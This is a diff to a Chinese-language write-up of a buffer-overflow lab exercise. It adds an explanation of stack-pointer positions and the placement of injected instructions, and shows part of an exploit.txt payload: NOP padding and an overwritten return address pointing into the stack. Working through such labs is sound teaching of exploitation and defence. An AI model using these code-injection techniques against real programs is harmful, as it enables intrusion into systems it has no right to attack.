@@ -203,7 +203,7 @@ Disassembly of section .text:
   15:   c3                      retq
 ```
 
-只需将前一关的地址略作修改：
+将指令编码编入 `exploit.txt` 的前半部分，并确保 `0xc3` 的地址位于 `0x5561dc90` 之前：
 
 ```c
 /* exploit.txt */
@@ -217,6 +217,11 @@ Disassembly of section .text:
 /* 0x5561dc98 */ 90 90 90 90 90 90 90 90
 /* 0x5561dca0 */ 78 dc 61 55 00 00 00 00
 ```
+之所以要这样安排，是因为
+
+- 执行完 `getbuf()` 的 `retq` 指令后，栈顶 `R[rsp]` 位于 `0x5561dca8` 处。
+- 执行三次 `pushq` 指令后，栈顶位于 `0x5561dc90` 处。
+- 若指令位于栈内，执行时会发生 Segmentation Fault。
 
 最终得以下输出：
 
